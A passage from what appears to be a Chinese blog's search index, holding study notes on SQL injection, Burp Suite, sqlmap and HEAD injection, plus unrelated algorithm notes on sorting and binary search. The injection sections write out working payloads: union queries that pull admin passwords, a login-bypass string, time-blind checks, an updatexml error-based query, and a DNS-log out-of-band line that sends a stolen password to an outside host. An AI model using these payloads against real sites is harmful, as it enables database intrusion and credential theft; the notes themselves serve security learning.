网页没有内容 ==&gt; 这个网站存在数据库注入漏洞。原因：我们输入的数据库语句被网站代入到他的数据库中执行了。 2.判断字段（列）数， order by ，作用是排序。 order by 1 --&gt; 页面有内容，说明网站的那个表有1列 order by 2 --&gt; 页面有内容，说明网站的那个表有2列 order by 3 --&gt; 页面没有内容，说明网站的那个表没有3列，--&gt; 只有2列。3.查看回显点： union ，作用是联合查询，能够同时执行两条数据库查询语句。 注意：必须保证两条数据库查询语句查询的表的列数一致。这也是步骤2的必要性。回显点的作用：在该处输入的任何数据库语句，都会被直接执行，并且显示到页面上！如修改select 1,2中的2，页面内容发生变化，则第二列为回显点。4.查询相关内容 and 1=2 union select 1,2 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1 and 1=2 union select 1,password from admin limit 0,1 # hellohack 用到的函数： 12version() ，# 作用 ：查询版本 ， 如5.5.53database() # 作用：查询当前数据库的库名 4.其他类型判断注入漏洞 我们发现在这里url显示id=1但实际上id=’1’,多了引号，如果还像上面那样用and 1=2判断就会变成id=’1 and 1=2’，即输入的内容会被包括在引号里。我们想到在1后面加个引号，再加上and 1=2，此时会变成 此时只需注释掉最后一个引号即可。mysql的两种注释： 12-- abc #abc不会被识别，注意--后有空格，但打空格会被自动取消掉，可以打空格的unicode编码%20或+#abc #注意不能打#,要打#的unicode编码%23 5.get注入与post注入数据包的第一行的第一个是请求方式GET或POST 以上在URL中传递参数为GET注入在网址需要转换成unicode；如果是在网页的框内，为POST注入,应该不转换。万能密码：猜测源代码中有’要形成闭合，#意味注释掉后续代码，因为1=1为真，所以代码执行后为真，通过 123数字型判断：and 1=1 / and 1=2字符型判断：' and 1=1 -- '搜索型判断：and %' -- q id='%abc%' 怎么知道是什么类型的？暴力枚举–有类似万能密码字典的东西。 5.盲注盲注和显错注入的区别就是没有回显点。即我们要通过判断的方式，去查询相关数据内容用到的函数： 1234567length(database()) # 查询的是【当前数据库库名】的长度。length(database())=2 --&gt; 无查询数据 --&gt; 当前数据库的库名不是2个字符substr(字符串,m,n) # 函数，作用是截取。substr('cmd',1,1) # --&gt; 截取的是 c substr(database(),1,1) # 截取【当前数据库库名】的第一个字符。and substr(database(),1,1)='a' --&gt; 页面无内容--&gt; 说明当前数据库库名第一个字符不是a 1and substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1) = 'a' --&gt; 第一个字符不是a 以上均为布尔盲注，还有一种时间盲注，需用到sleep(),这个函数能让网页延迟显示 12and sleep(5) # 网站延时了5秒再显示。if(length(database())=12,sleep(5),1) --&gt; 网站延迟显示5秒，说明判断条件是对的--&gt;当前数据库库明的长度是12 可见，盲注很费时间。由此诞生了专门针对数据库注入漏洞的sqlmap工具。 6.DNS_LOG注入利用DNS解析然后配合日志记录，将数据库里面的数据拿出来。 特点：能够将盲注变成显错注入。oob： out of bind 数据外带。 （1）什么是DNS把域名转换成IP地址的协议。域名-&gt;IP的外号 123域名 ip地址qq.com 12.34.56.78taobao.com 34.55.88.99 123a、网站搭建在服务器上b、服务器就是电脑c、访问网站的本质：浏览互联网上某台电脑上的某个文件 例如，修改host文件(本地DNS服务器)，我们输入完http://www.chenchan.com这个域名之后，咱们电脑会先访问host文件，就会将www.chenchan.com解析成192.168.189.128，然后访问这个IP。 （2）子域名和DNS日志记录DNS解析记录的日志网站,作用：可以申请一个域名，然后会记录下任何访问了这个域名和子域名的IP 12fefaad.dnslog.cn 都有记录。database.fefaad.dnslog.cn 也有记录 (3)注入方法关键函数： 123load_file() # 作用是：读文件concat() # 作用是 拼接字符串select load_file() #读取文件内容 命令： 12select load_file(concat(‘//’,(数据库语句),’.域名/1.txt’))select load_file(concat('//',(select password from admin limit 0,1),'.qtm0xb.dnslog.cn/1.txt')) 如图，发现没有回显点后，先输入and (),要执行括号里的语句:select load_file(concat(‘//’,(数据库语句),’.域名/1.txt’))注意一定要带一个文件，文件是什么无所谓，但loadfile是读取文件的，必须在mysql命令里写一个文件名上去。 二、BurpSuite什么是BurpSuite原理：中间人原理(如0元支付漏洞) 特点： 12所有模块可共享一个数据请求能测试网站所有的漏洞 安装和配置kali自带的是免费的社区版，功能有限，我们自己安装专业版 选择manual activation，然后无脑下一步 字体设置：user option -display 浏览器代理设置：burp依赖于浏览器代理。安装SwitchyOmega插件即可，该插件作用是智能化设置浏览器代理。 记得把插件设置成proxy模式 安装证书：burp默认只能访问http，要访问https的话需要安装CA证书。在burp的proxy模块–options–import/export CA–选择export的certificate in DER format–导出证书的位置(如桌面，保存为1.cer) 然后把证书导入到浏览器里，设置里搜索证书，导入1.cer即可 常用模块Target:容易探测越权类漏洞黑体代表访问过的站点，灰体代表没访问过但黑体站点包含的站点。scope可以设置查看网站的范围。 123通常配合spider(爬虫)、scanner(扫描web漏洞)模块使用。spider:将目标网站所有的网页让工具走一遍，然后配合filter找出有参数的页面scanner:AWVS,appscan,X-ray做的比burp好 proxy:burp的核心作用–抓数据包改包数据包分为请求数据包和响应数据包 12输入url,回车 --请求回车后，出现网页内容 --响应 浏览器拿到响应后渲染出页面 HTTP history可查看请求和响应option可改监听的端口(默认是8080，如果改成8081则浏览器也要改成8081)，还可以移除需要的验证(如javascript);显示隐藏内容;自动匹配与替换请求包的内容 repeater：手动探测漏洞比如proxy模块抓包后转发到repeater模块(体现了所有模块可共享数据请求)，可以直接查看响应内容。 intruder：爆破爆破是一种常见思想。 123position --设置爆破位置,默认会帮我们设，可以clear掉payloads --设置爆破字典option --可改爆破速度(number of threads,如50) 根据响应长度来判断(和大多数不一样) 宏：自动化设置数据 有验证码不能重复？配合其他工具使用 extender：安装插件CO2:与sqlmap结合，需配置sqlmap位置如下 jython.jar:让burp能使用python写的插件burpJSlinkFinder:能快速发现权限方面的漏洞，需python 三、sqlmapSqlmap 是一个开源的渗透测试工具，可以自动检测和利用 SQL 注入缺陷以及接管数据库服务器的过程。 官网。注意：kali自带sqlmap工具。特点： 123全面支持各种常用的数据库语言全面支持六种SQL注入技术：布尔、时间、错误、联合、堆叠、oobsqlmap偏向于跑盲注 用法： 123456python sqlmap.py -u &quot;输入网址&quot; #要cd sqlmap.py目录，windows用法sqlmap -u &quot;url&quot; #kali用法-h #帮助sqlmap -u &quot;?id=1&amp;wd=123&quot; -p id,wd #指定测试的参数，默认测试所有参数 --逐参删除法，直到找到影响页面的参数，只能跟-usqlmap -r 1.txt #确定目标网站，1.txt存放burp抓到的请求包sqlmap -r 1.txt --data=&quot;wd=123,id=1&quot; #确定参数，可以跟-u和-r 执行时会出现for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n],是否包括所有针对“MySQL”扩展提供的级别(1)和风险(1)值的测试 [Y/n] 输入”N” POST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? [y/N]POST参数’n’是脆弱的。 你想继续测试其他人(如果有的话)吗？[y/N] 输入”Y” 当发现网站确实存在漏洞，就可以找数据了 1234567--dbs #查询所有数据库的库名-D 指定数据库--tables #查看所有的表-T 指定表名--columns #查询所有的列名-C 指定列名 如-D maoshe -T admin -C password --dump--dump ：查看数据 执行时出现do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')?是否基于时间注入，选Y 进阶命令： 1 总结学习了sql注入的原理和sqlmap的使用方法。 参考资料1.sqlmap中文文档","link":"/2022/04/10/sql%E6%B3%A8%E5%85%A5%E5%92%8Csqlmap/"},{"title":"acwing 1.基础算法（一）","text":"摘要：acwing算法基础课学习笔记 零、如何学123主要思想 &lt;-- 上课理解并背过代码模板 &lt;--快速默写并调试通过题目 &lt;--提高熟练度(写完删掉重写一遍，重复3-5遍) 一、基础算法（一）排序快速排序 –基于分治123确定分界点x：q(l),q(r),q((l+r)/2),随机调整区间：保证左边的数&lt;=x,右边&gt;=x递归处理左右两边 难点是如何调整区间 1234#暴力做法开两个数组a[],b[]遍历q[l~r],若&lt;=x,插到a;若&gt;x，插到ba[]-&gt;q[],b[]-&gt;q[] 1234567#优美做法(双指针)创建两个指针L,R(也可用序号表示)L一直向右移，直到找到一个&gt;x的数，停下R一直向左移，直到找到一个&lt;=x的数，停下#此时L指向的数应放到右边，R指向的数应放到左边swap L，R对应的数，此时L指向的就是&lt;=x的，R指向的是&gt;=x的重复直至L,R相遇 怎么判断递归的序号起止？ 1234j停留的位置一定不满足&gt;x,即q[j]&lt;=xi停留的位置一定不满足&lt;x,即q[i]&gt;=xsort(q,l,j) //sort(q,l,i-1)sort(q,j+1,r) //sort(q,i,r) 注意边界问题： 12345若递归选择i，则分界点不能是q[l];j同理不能是q[r]中间点q[(l+r+1)/2]是万能的,建议选中点，也不容易超时如样例：n=2,q=[1,2]第一次递归时i=j=0,sort(q,0,-1),sort(q,0,1);会无限循环sort(q,0,1) 归并排序 –分治快排是先排后递归，归并是先递归再排 123确定分界点：mid = (l+r)/2递归排序left,right把两个有序的数组合成一个(难点) &lt;--双指针 (合并链表也是同样的原理) 如果两个值相同，一般是把第一个序列的指针往后移动一位（归并排序是稳定的） 二分整数二分只要看到有序序列，一定想到二分，或先排序后二分。每次保证更新的闭区间里一定有答案。 为什么第一种模板mid有一个+1？ 如果mid=(l+r)/2，如果某次划分的二分区间是[l,r]且l=r-1，则mid=下取整(l+r)/2=l,若check判断为true的话，则更新的区间仍为[l,r],即无限循环 12mid=l+r&gt;&gt;1check(mid) 模板如下 二分法一定有解，题目可能无解，无解时，返回值的含义是第一个满足条件的。 浮点数二分保留六位小数 1r-l&gt;=1e-8 //经验值是保留的位数+2，若不满足要求可进一步提高精度 注意浮点数一定是严格按照[l,mid],[mid,r]来分的因为没有mid+1或mid-1，所以mid=(l+r)/2，不必再考虑+1的问题 总结这节课学了排序(包括快排、归并)和二分(整数、浮点数)的模板","link":"/2022/04/14/acwing%201.%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"head注入","text":"摘要：本文介绍了head注入是什么及其背后的原理，以及利用sqlmap工具进行head注入的实践 前言靶场1 一、head注入HEAD注入条件是知道用户名密码或登录状态 网络中web访问是以IP数据包形式传输数据，每个数据包由头部（head）和数据体（body）组成，head中有访问者的各种信息。 有的网站他会为了保存我们的信息作为比对会把head头中的信息保存到数据库中以便下一次使用。通讯时我们若能抓到请求数据包，并将头部中身份信息修改则为HEAD注入。抓包实例如下（使用burp） 就像图中User-Agent本意是表示你是哪种访问方式例如苹果、微软、安卓、华为等等，图中我把他的值更换为了一个注入语句，并报错就返回了我关心的结果。 二、用到的函数：12updataxml或extractvalue #报错函数 head注入是通过引起报错，来返回需要的信息，所以不需要回显点concat 下面详细讲解UPDATEXML (XML_document, XPath_string, new_value); 1234第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串)&lt;--有特定要求格式第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变XML_document文档中符合XPATH_string的值 注入语句为 1updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出错误ERROR 1105 (HY000): XPATH syntax error: '得到的数据' 总结 参考资料1.渗透测试基础-HEAD注入","link":"/2022/04/13/head%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"Signal and System","slug":"Signal-and-System","link":"/tags/Signal-and-System/"},{"name":"FFT","slug":"FFT","link":"/tags/FFT/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Icarus","slug":"Icarus","link":"/tags/Icarus/"},{"name":"Blog","slug":"Blog","link":"/tags/Blog/"},{"name":"Github","slug":"Github","link":"/tags/Github/"},{"name":"https","slug":"https","link":"/tags/https/"},{"name":"kali","slug":"kali","link":"/tags/kali/"},{"name":"vmware","slug":"vmware","link":"/tags/vmware/"},{"name":"cookie","slug":"cookie","link":"/tags/cookie/"},{"name":"head response","slug":"head-response","link":"/tags/head-response/"},{"name":"http","slug":"http","link":"/tags/http/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"robots协议","slug":"robots协议","link":"/tags/robots%E5%8D%8F%E8%AE%AE/"},{"name":"spider","slug":"spider","link":"/tags/spider/"},{"name":"url","slug":"url","link":"/tags/url/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"sql注入","slug":"sql注入","link":"/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"splmap","slug":"splmap","link":"/tags/splmap/"},{"name":"algorithm","slug":"algorithm","link":"/tags/algorithm/"},{"name":"acwing","slug":"acwing","link":"/tags/acwing/"},{"name":"C++","slug":"C","link":"/tags/C/"}],"categories":[{"name":"EE","slug":"EE","link":"/categories/EE/"},{"name":"CS","slug":"CS","link":"/categories/CS/"},{"name":"Signal and System","slug":"EE/Signal-and-System","link":"/categories/EE/Signal-and-System/"},{"name":"Blog","slug":"CS/Blog","link":"/categories/CS/Blog/"},{"name":"security","slug":"CS/security","link":"/categories/CS/security/"},{"name":"python","slug":"CS/python","link":"/categories/CS/python/"},{"name":"algorithm","slug":"CS/algorithm","link":"/categories/CS/algorithm/"}]}